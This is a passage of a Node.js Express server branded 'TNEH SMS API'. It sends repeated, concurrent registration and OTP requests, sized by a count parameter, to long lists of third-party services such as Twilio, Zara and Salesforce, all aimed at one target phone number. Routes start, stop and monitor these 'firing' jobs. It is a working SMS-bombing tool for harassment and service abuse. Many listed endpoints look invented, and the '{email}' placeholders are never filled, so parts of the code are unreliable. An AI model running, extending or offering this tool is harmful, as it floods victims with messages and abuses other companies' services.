  add('Zara','https://api.zara.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('H&M','https://api.hm.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Gap','https://api.gap.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('ASOS','https://api.asos.com/identity/v3/register',{email:'{email}',password:'Pass@123'});

  // ── BLOCK 14 — GLOBAL CLOUD & DEV ──
  add('DigitalOcean','https://api.digitalocean.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Linode','https://api.linode.com/v4/account/register',{email:'{email}',password:'Pass@123'});
  add('Vultr','https://api.vultr.com/v2/users/register',{email:'{email}',password:'Pass@123'});
  add('Heroku','https://api.heroku.com/account/register',{email:'{email}',password:'Pass@123'});
  add('Render','https://api.render.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Netlify','https://api.netlify.com/api/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Vercel','https://api.vercel.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Supabase','https://api.supabase.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('MongoDB','https://api.mongodb.com/v2/users/register',{email:'{email}',password:'Pass@123'});
  add('Cloudflare','https://api.cloudflare.com/client/v4/user/register',{email:'{email}',password:'Pass@123'});

  // ── BLOCK 15 — GLOBAL SMS GATEWAYS & CRM ──
  add('Twilio','https://api.twilio.com/register',{Email:'{email}',Password:'Pass@123'});
  add('Vonage','https://api.vonage.com/v1/user/register',{email:'{email}',password:'Pass@123'});
  add('MessageBird','https://api.messagebird.com/users/register',{email:'{email}',password:'Pass@123'});
  add('Plivo','https://api.plivo.com/v1/Account/register/',{email:'{email}',password:'Pass@123'});
  add('Sinch','https://api.sinch.com/v1/user/register',{email:'{email}',password:'Pass@123'});
  add('Infobip','https://api.infobip.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('BulkSMS','https://api.bulksms.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('ClickSend','https://api.clicksend.com/v3/users/register',{email:'{email}',password:'Pass@123'});
  add('SendGrid','https://api.sendgrid.com/v3/users/register',{email:'{email}',password:'Pass@123'});
  add('Brevo','https://api.brevo.com/v3/users/register',{email:'{email}',password:'Pass@123'});
  add('Mailchimp','https://api.mailchimp.com/3.0/users/register',{email:'{email}',password:'Pass@123'});
  add('HubSpot','https://api.hubspot.com/contacts/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Intercom','https://api.intercom.io/contacts/register',{email:'{email}',phone:'{phone}'});
  add('Zendesk','https://api.zendesk.com/api/v2/users/register',{user:{email:'{email}',password:'Pass@123'}});
  add('Freshdesk','https://api.freshdesk.com/v2/contacts',{email:'{email}',phone:'{phone}'});
  add('Zoho CRM','https://api.zoho.com/crm/v2/users/register',{email:'{email}',password:'Pass@123'});
  add('Salesforce','https://api.salesforce.com/v56.0/sobjects/User/register',{Email:'{email}'});
  add('Pipedrive','https://api.pipedrive.com/v1/users/register',{email:'{email}',password:'Pass@123'});

  return S;
})();

// ══════════════════════════════════════════════════════════════
// CLEANUP EXPIRED JOBS
// ══════════════════════════════════════════════════════════════

setInterval(() => {
  const now = Date.now();
  let removed = 0;
  for (const [id, job] of JOBS.entries()) {
    if (job.finishedAt && now - job.finishedAt > JOB_TTL_MS) {
      JOBS.delete(id);
      removed++;
    }
  }
  if (removed) console.log(`[cleanup] Removed ${removed}. Active: ${JOBS.size}`);
}, 5 * 60 * 1000).unref();

// ══════════════════════════════════════════════════════════════
// HELPERS
// ══════════════════════════════════════════════════════════════

function validatePhone(p) {
  const d = String(p).replace(/\D/g, '');
  return d.length >= 10 && d.length <= 13 ? d : null;
}
function nowIso() { return new Date().toISOString(); }

function pickServices(services, query) {
  if (!query) return services;
  const toks = String(query).split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
  if (!toks.length) return services;
  return services.filter(s =>
    toks.some(t => s.name.toLowerCase().includes(t) || String(s.id) === t)
  );
}

async function sendToService(service, phone, parentSignal) {
  let body;
  try {
    body = JSON.parse(JSON.stringify(service.body)
      .replace(/{phone}/g, phone)
      .replace(/{phone_no_plus}/g, phone.startsWith('+') ? phone : `+91${phone}`));
  } catch (_) {
    return { name: service.name, status: 0, ok: false, error: 'body_build_failed' };
  }
  const url = String(service.url).replace(/{phone_no_plus}/g, phone);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), PER_REQUEST_TIMEOUT);
  if (parentSignal) {
    if (parentSignal.aborted) controller.abort();
    else parentSignal.addEventListener('abort', () => controller.abort(), { once: true });
  }
  try {
    const opts = {
      method: service.method || 'POST',
      headers: service.headers || { 'Content-Type': 'application/json' },
      signal: controller.signal
    };
    if (opts.method !== 'GET') opts.body = JSON.stringify(body);
    const res = await fetch(url, opts);
    return { name: service.name, status: res.status, ok: res.ok };
  } catch (err) {
    const isAbort = err.name === 'AbortError';
    return { name: service.name, status: 0, ok: false, error: isAbort ? 'timeout' : (err.message || 'network_error') };
  } finally {
    clearTimeout(timer);
  }
}

async function runPool(tasks, concurrency, onEach, job) {
  let index = 0;
  const total = tasks.length;
  async function worker() {
    while (true) {
      if (job && job.stopped) return;
      const i = index++;
      if (i >= total) return;
      try {
        const result = await tasks[i]();
        onEach && onEach(result);
      } catch (e) {
        onEach && onEach({ name: 'unknown', status: 0, ok: false, error: e.message });
      }
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, total) }, worker));
}

function summary(job) {
  const elapsedMs = job.finishedAt
    ? (new Date(job.finishedAt).getTime() - new Date(job.startedAt).getTime())
    : (Date.now() - new Date(job.startedAt).getTime());
  return {
    jobId: job.jobId, phone: job.phone, status: job.status,
    totalServices: job.totalServices, countPerService: job.countPerService,
    total: job.total, completed: job.completed,
    success: job.success, failed: job.failed,
    progress: `${job.completed}/${job.total}`, elapsedMs,
    startedAt: job.startedAt, finishedAt: job.finishedAt, stoppedAt: job.stoppedAt
  };
}

// ══════════════════════════════════════════════════════════════
// ROUTES
// ══════════════════════════════════════════════════════════════

router.get('/api/sms', async (req, res) => {
  const phone = validatePhone(req.query.number);
  if (!phone) return res.status(400).json({ success: false, error: 'Invalid or missing `number`' });

  const count = Math.min(Math.max(parseInt(req.query.count, 10) || DEFAULT_COUNT, 1), MAX_COUNT_PER_SVC);
  const services = pickServices(INDIAN_APIS, req.query.services);
  if (!services.length) return res.status(400).json({ success: false, error: 'No matching services' });

  const tasks = [];
  for (let r = 0; r < count; r++) for (const s of services) tasks.push(() => sendToService(s, phone));

  if (JOBS.size >= MAX_JOBS) {
    const oldest = JOBS.keys().next().value;
    if (oldest) JOBS.delete(oldest);
  }

  const jobId = `job_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const abortController = new AbortController();
  const job = {
    jobId, phone, totalServices: services.length, countPerService: count,
    total: tasks.length, completed: 0, success: 0, failed: 0,
    status: 'running', stopped: false,
    startedAt: nowIso(), finishedAt: null, stoppedAt: null, results: [],
    _abort: abortController, _signal: abortController.signal
  };
  JOBS.set(jobId, job);
  console.log(`[${jobId}] FIRING ${tasks.length} requests at ${phone}`);

  res.json({
    success: true, jobId, phone,
    services: services.length, countPerService: count,
    totalRequests: tasks.length, concurrency: GLOBAL_CONCURRENCY, status: 'running',
    message: `Started. Stop: /api/stop?jobid=${jobId}`
  });

  (async () => {
    try {
      await runPool(tasks, GLOBAL_CONCURRENCY, (r) => {
        if (job.stopped) return;
        job.completed++;
        if (r.ok) job.success++; else job.failed++;
        if (job.results.length < 500) job.results.push(r);
      }, job);
    } catch (e) {
      console.error(`[${jobId}] Pool error: ${e.message}`);
    } finally {
      if (!job.stopped) job.status = 'completed';
      job.finishedAt = nowIso();
      job._abort = null;
      const s = summary(job);
      console.log(`[${jobId}] DONE. ok=${job.success} fail=${job.failed} total=${job.total} elapsed=${s.elapsedMs}ms`);
    }
  })();
});

router.get('/api/stop', (req, res) => {
  const job = JOBS.get(req.query.jobid);
  if (!job) return res.status(404).json({ success: false, error: 'Job not found' });
  if (job.stopped) return res.json({ success: true, jobId: job.jobId, message: 'Already stopped', ...summary(job) });
  job.stopped = true; job.status = 'stopped';
  job.stoppedAt = nowIso(); job.finishedAt = nowIso();
  if (job._signal && !job._signal.aborted) { try { job._abort.abort(); } catch (_) {} }
  res.json({ success: true, jobId: job.jobId, message: 'Job stopped', ...summary(job) });
});

router.get('/api/status', (req, res) => {
  const job = JOBS.get(req.query.jobid);
  if (!job) return res.status(404).json({ success: false, error: 'Job not found' });
  res.json({ success: true, ...summary(job) });
});

router.get('/api/log', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
  const jobs = [...JOBS.values()].map(summary)
    .sort((a, b) => (b.startedAt > a.startedAt ? 1 : -1)).slice(0, limit);
  res.json({ success: true, total: jobs.length, jobs });
});

// ══════════════════════════════════════════════════════════════
// ★ SELF-BOOT — makes this file runnable directly by Render
// ══════════════════════════════════════════════════════════════

console.log(`🇮🇳 TNEH SMS module loaded: ${INDIAN_APIS.length} services`);

if (require.main === module) {
  const app = express();
  const PORT = process.env.PORT || 3000;
  const HOST = '0.0.0.0';

  app.use(require('cors')());
  app.use(express.json({ limit: '2mb' }));
  app.use(express.urlencoded({ extended: true }));
  app.use(router);

  app.get('/', (req, res) => {
    res.json({
      name: 'TNEH Indian SMS API',
      developer: '@tneh_owner',
      status: 'running',
      services: INDIAN_APIS.length,
      endpoints: {
        sms: '/api/sms?number=&count=&services=',
        stop: '/api/stop?jobid=',
        status: '/api/status?jobid=',
        log: '/api/log'
      }
    });
  });

  app.use((req, res) => res.status(404).json({ success: false, error: 'Not found' }));

  app.listen(PORT, HOST, () => {
    console.log('════════════════════════════════════════════');
    console.log('  🔥 TNEH SMS API 🔥');
    console.log('  DV: @tneh_owner');
    console.log(`  Listening on http://${HOST}:${PORT}`);
    console.log('════════════════════════════════════════════');
  });
}

module.exports = router;
